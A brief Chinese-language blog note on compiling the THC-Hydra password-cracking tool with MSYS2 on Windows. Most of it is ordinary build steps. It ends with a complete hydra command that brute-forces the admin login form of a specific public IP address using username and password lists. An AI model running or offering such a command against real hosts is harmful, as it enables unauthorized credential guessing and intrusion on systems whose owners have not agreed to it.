---
author: XhstormR
categories:
- Notes
date: 2019-03-01T14:11:28+08:00
title: 构建 hydra
---

<!--more-->

Updated on 2019-03-01

> [MSYS2](https://mirrors.ustc.edu.cn/help/msys2.html)
>
> [hydra](https://github.com/vanhauser-thc/thc-hydra/archive/master.zip)

## Step
```bash
D:\Work\Download\thc-hydra-master>

pacman -Syu
pacman -S --noconfirm --needed gcc make

./configure
make
make install

hydra -V -F -L username.txt -P password.txt -o ok.txt 'http-post-form://222.69.159.53:80/cm_admin/login.aspx:txtloginid=^USER^&txtpsw=^PASS^:F=password incorrect!'
```

## Reference
* 依赖：
  * msys-2.0.dll：[src](https://mirrors.ustc.edu.cn/msys2/msys/sources/msys2-runtime-2.11.2-1.src.tar.gz) | [bin](https://mirrors.ustc.edu.cn/msys2/msys/x86_64/msys2-runtime-2.11.2-1-x86_64.pkg.tar.xz)
* [MSYS2](https://www.msys2.org)
